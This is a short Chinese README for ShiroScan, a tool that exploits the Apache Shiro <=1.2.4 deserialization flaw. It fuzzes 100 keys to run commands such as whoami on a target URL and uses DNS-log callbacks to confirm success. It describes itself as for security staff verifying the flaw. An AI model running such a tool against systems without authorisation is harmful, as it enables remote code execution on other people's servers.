# ShiroScan
Shiro&lt;=1.2.4反序列化，一键检测工具

```
集成100个key进行fuzz
```

* 本项目基于https://github.com/sv3nbeast/ShiroScan 进行代码重构
* pip3 install -r requirments.txt     

* Usage：python3 shiro.py  url  command
* Usage：python3 shiro.py  http://url.com  whoami

* http://www.dnslog.cn/   验证推荐使用这个dnslog平台，速度比ceye.io要快很多
* 执行的命令带空格记得用""引起来

* usage：python3 shiro.py  http://url.com  "ping dnslog.cn"
* 7个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为编码还不够多
* 请自行收集编码，直接添加到key1.txt里就行了

## 
## 仅供安全人员验证,测试是否存在此漏洞


